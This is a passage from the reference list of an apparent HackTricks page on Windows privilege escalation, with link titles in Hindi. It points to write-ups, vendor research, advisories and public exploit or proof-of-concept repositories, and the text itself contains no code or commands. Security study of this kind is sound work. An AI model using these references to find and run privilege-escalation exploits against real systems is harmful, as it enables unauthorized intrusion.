- [12] [0xdf – HTB/VulnLab JobTwo: SMTP के ज़रिए Word VBA macro phishing → hMailServer credential decryption → SYSTEM के लिए Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) और kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox का पीछा: Kernel Shadows में Cat & Mouse](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADA System में मौजूद Privileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlink का उपयोग](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [अतीत से एक Link। Windows पर Symbolic Links का दुरुपयोग](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows पर ख़तरनाक Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: `node_modules` folders से लोड करना](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist की चुनौतियाँ, हल की गईं](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop के साथ Pwn2Own: Windows LPE के लिए CLDFLT और DirectX Kernel Race Conditions को chain करना](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [सभी पर राज करने वाला एक I/O Ring: Windows 11 पर पूर्ण Read/Write Exploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Privilege Escalation और अन्य बेहतरीन तरकीबों के लिए Arbitrary File Deletes का दुरुपयोग](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Part 2: CVE-2020-1013, Windows 10 का Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager और Windows Vault की पड़ताल](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Image में बदलाव से Privilege Escalation कैसे होता है](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent से Ssh Private Keys निकालना](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Enterprise Update Servers को Backdoor Factories में बदलना (0_o) – Part 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Enterprise Update Servers को Backdoor Factories में बदलना (0_o) – Part 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer Folder Delete Privilege Escalation](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: अपने कदमों को वापस NT AUTHORITY\SYSTEM तक trace करना](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Windows MIDI Services shared-memory offsets privilege escalation advisory](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
